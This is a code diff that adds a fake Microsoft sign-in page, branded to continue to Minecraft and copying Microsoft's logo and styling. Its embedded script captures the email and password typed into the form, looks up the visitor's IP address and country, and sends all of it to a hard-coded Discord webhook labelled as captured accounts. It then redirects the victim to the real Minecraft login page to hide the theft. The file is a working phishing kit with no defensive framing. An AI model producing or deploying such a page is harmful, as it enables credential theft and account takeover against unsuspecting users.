@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in to your Microsoft account</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet"/>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: white;
+      padding: 44px;
+      border-radius: 8px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+      width: 440px;
+      max-width: 90%;
+    }
+    .logo { text-align: center; margin-bottom: 32px; }
+    h1 { font-size: 24px; color: #1b1b1b; margin-bottom: 8px; text-align: center; }
+    .subtitle { color: #605e5c; font-size: 15px; margin-bottom: 24px; text-align: center; }
+    input {
+      width: 100%;
+      padding: 10px 12px;
+      margin-bottom: 16px;
+      border: 1px solid #8a8886;
+      border-radius: 2px;
+      font-size: 15px;
+      outline: none;
+    }
+    input:focus { border-color: #0078d4; }
+    button {
+      width: 100%;
+      background: #0067b8;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 15px;
+      cursor: pointer;
+      border-radius: 2px;
+      font-weight: 600;
+    }
+    button:hover { background: #005a9e; }
+    .footer { margin-top: 20px; text-align: center; font-size: 13px; color: #605e5c; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#f25022" d="M0 0h11.377v11.377H0z"/>
+        <path fill="#00a4ef" d="M12.623 0H24v11.377H12.623z"/>
+        <path fill="#7fba00" d="M0 12.623h11.377V24H0z"/>
+        <path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/>
+      </svg>
+    </div>
+    <h1>Sign in</h1>
+    <p class="subtitle">to continue to Minecraft</p>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email, phone, or Skype" required autofocus/>
+      <input type="password" id="password" placeholder="Password" required/>
+      <button type="submit">Sign in</button>
+    </form>
+    <div class="footer">Can't access your account?</div>
+  </div>
+
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1481586453480738846/zKbUH_Km_K4HJSZuMxFd9lwvoW6OettV9nxP9xksNPsSxoEvxDfc4rjugPvVO6K7cKgl";
+    
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      let userInfo = { ip: 'Unknown', country: 'Unknown' };
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        userInfo = await res.json();
+      } catch(e) {}
+
+      await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: "🎯 VRRİCTA Account Captured",
+            color: 3066993,
+            fields: [
+              { name: "📧 Email", value: `\`\`\`${email}\`\`\``, inline: false },
+              { name: "🔑 Password", value: `\`\`\`${password}\`\`\``, inline: false },
+              { name: "🌍 IP", value: userInfo.ip || 'Unknown', inline: true },
+              { name: "🏳️ Country", value: userInfo.country_name || 'Unknown', inline: true },
+              { name: "📱 Device", value: navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop', inline: true }
+            ],
+            timestamp: new Date()
+          }]
+        })
+      });
+
+      setTimeout(() => {
+        window.location.href = "https://www.minecraft.net/en-us/login";
+      }, 800);
+    });
+  </script>
+</body>
+</html>
